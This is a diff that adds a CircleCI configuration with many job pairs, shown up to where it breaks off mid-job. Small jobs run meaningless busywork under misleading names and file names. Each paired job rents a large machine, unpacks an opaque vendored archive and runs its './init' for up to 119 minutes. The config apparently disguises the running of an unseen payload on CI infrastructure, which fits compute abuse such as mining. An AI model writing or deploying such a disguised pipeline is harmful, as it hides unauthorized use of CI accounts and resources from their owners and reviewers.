@@ -1,0 +1,1495 @@
+version: 2.1
+
+jobs:
+  wire_WEB-653:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; seq 1 1449998 | sha256sum > /tmp/_bld/21.data; true
+            size=$(wc -c </tmp/_bld/21.data); echo "stage ok: WEB-653 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 21.data
+  WEB-653:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/21.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  bundle_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 284743 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/_bld/final.log
+            size=$(wc -c </tmp/_bld/final.log); echo "stage ok: canary size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - final.log
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/final.log 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  warmup_feat-2132:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<266416;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/_bld/trace.ndjson
+            size=$(wc -c </tmp/_bld/trace.ndjson); echo "stage ok: feat-2132 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.ndjson
+  feat-2132:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/trace.ndjson 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  stage_shippit-25:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=1;a++)for(b=1;b<=3613;b++)s+=a*b;print s}'; true ; } > /tmp/_bld/counts.jsonl
+            size=$(wc -c </tmp/_bld/counts.jsonl); echo "stage ok: shippit-25 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - counts.jsonl
+  shippit-25:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  teardown_greg-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=6 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/_bld/package
+            size=$(wc -c </tmp/_bld/package); echo "stage ok: greg-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  greg-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/package 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  cook_add-router-v2-reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Project tail bytes
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 17455); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/_bld/ckpt-A.pickle
+            size=$(wc -c </tmp/_bld/ckpt-A.pickle); echo "stage ok: add-router-v2-reload size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-A.pickle
+  add-router-v2-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/ckpt-A.pickle 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  produce_DEPLOY_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 409600 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/_bld/secondary_task_output.txt
+            size=$(wc -c </tmp/_bld/secondary_task_output.txt); echo "stage ok: DEPLOY_STG size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - secondary_task_output.txt
+  DEPLOY_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  provision_py310-bench:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<432133;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/_bld/.done
+            size=$(wc -c </tmp/_bld/.done); echo "stage ok: py310-bench size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .done
+  py310-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/.done 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  warmup_phoenix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<46851;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/_bld/FINAL
+            size=$(wc -c </tmp/_bld/FINAL); echo "stage ok: phoenix size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - FINAL
+  phoenix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  tmp_API-985:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 654184 | awk 'NR%11==0{sum+=$1}END{print sum}'; true ; } > /tmp/_bld/trace.gz
+            size=$(wc -c </tmp/_bld/trace.gz); echo "stage ok: API-985 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - trace.gz
+  API-985:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/trace.gz 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  fetcher_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 22000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/_bld/payload
+            size=$(wc -c </tmp/_bld/payload); echo "stage ok: release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - payload
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/payload 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  g2_build-nightly-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 392395 | md5sum; true ; } > /tmp/_bld/331v2.txt
+            size=$(wc -c </tmp/_bld/331v2.txt); echo "stage ok: build-nightly-regression-suite size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 331v2.txt
+  build-nightly-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/331v2.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  g2_romeo-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1740800 | wc -c; true ; } > /tmp/_bld/492.data
+            size=$(wc -c </tmp/_bld/492.data); echo "stage ok: romeo-4 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 492.data
+  romeo-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/492.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  maker_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Measure entropy sample
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<453441;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/_bld/audit.ndjson
+            size=$(wc -c </tmp/_bld/audit.ndjson); echo "stage ok: teh-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.ndjson
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/audit.ndjson 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  reset_build-full-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Shape histogram tail
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 3072000 | base64 | head -c 200 | wc -c; true ; } > /tmp/_bld/DONE
+            size=$(wc -c </tmp/_bld/DONE); echo "stage ok: build-full-docker-image size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE
+  build-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/DONE 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  hook_rust-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 25165824 /dev/urandom | sha256sum; true ; } > /tmp/_bld/passoff.state
+            size=$(wc -c </tmp/_bld/passoff.state); echo "stage ok: rust-vet size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - passoff.state
+  rust-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/passoff.state 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  cook_io-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 379754 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/_bld/2024-03-04.data
+            size=$(wc -c </tmp/_bld/2024-03-04.data); echo "stage ok: io-ng size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-03-04.data
+  io-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/2024-03-04.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  db_atlas-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 14336000 | base64 | head -c 200 | wc -c; true ; } > /tmp/_bld/phase-complete.txt
+            size=$(wc -c </tmp/_bld/phase-complete.txt); echo "stage ok: atlas-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-complete.txt
+  atlas-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  postcheck_verify-staging-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prime cache tables
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 174080 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/_bld/step-pass.sig
+            size=$(wc -c </tmp/_bld/step-pass.sig); echo "stage ok: verify-staging-docker-image size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-pass.sig
+  verify-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  vendor_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pack vendor fragments
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=67733;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/_bld/stage-pass.log
+            size=$(wc -c </tmp/_bld/stage-pass.log); echo "stage ok: uniform size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-pass.log
+  uniform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/stage-pass.log 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  g2_apr15-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 18432 | wc -c; true ; } > /tmp/_bld/READY
+            size=$(wc -c </tmp/_bld/READY); echo "stage ok: apr15-ship size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - READY
+  apr15-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/FINAL 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  drain_cd-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 389773 | awk 'NR>2762 && NR<16156{s+=$1}END{print s}'; true ; } > /tmp/_bld/package.pkg
+            size=$(wc -c </tmp/_bld/package.pkg); echo "stage ok: cd-x size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package.pkg
+  cd-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/package.pkg 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  retry_DATA-567:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<450865;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/_bld/ckpt-E.pt
+            size=$(wc -c </tmp/_bld/ckpt-E.pt); echo "stage ok: DATA-567 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-E.pt
+  DATA-567:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  D_pat-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=130 2>/dev/null | md5sum; true ; } > /tmp/_bld/2023-06-04.data
+            size=$(wc -c </tmp/_bld/2023-06-04.data); echo "stage ok: pat-smoke size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-06-04.data
+  pat-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/2023-06-04.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  db_lima:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 173822 | awk 'NR%18==0{sum+=$1}END{print sum}'; true ; } > /tmp/_bld/ckpt-B.state
+            size=$(wc -c </tmp/_bld/ckpt-B.state); echo "stage ok: lima size=${size}"
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - ckpt-B.state
+  lima:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Inherit stage
+          command: |
+            { od -An -c /tmp/_bld/ckpt-B.state 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: /bin/sh -c "./init"
+  install_tweak-dashboard-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/_bld
